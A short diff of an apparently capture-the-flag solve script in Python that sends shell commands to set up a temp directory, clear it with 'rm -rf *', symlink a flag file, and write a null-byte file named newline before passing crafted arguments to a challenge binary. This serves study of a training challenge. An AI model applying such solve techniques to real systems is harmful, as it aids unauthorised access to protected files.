@@ -7,7 +7,7 @@ io.sendline('mkdir /tmp/nickbarak') #make dir in temp
 io.sendline('cd /tmp/nickbarak') #move wd to the dir
 io.sendline('rm -rf *') #clear the dir from past runs
 io.sendline('ln -s ~/flag flag') #create link to the flag file in ~
-io.sendline("printf '\\x00\\x00\\x00\\x000' > $'\\n'") #create file named \n for file portion
+io.sendline("printf '\\x00\\x00\\x00\\x00' > $'\\n'") #create file named \n for file portion
 
 args = ['A'] * 100 #set argc = 100 for argv part
 args[0] = '~/input' #set first arg to the file path
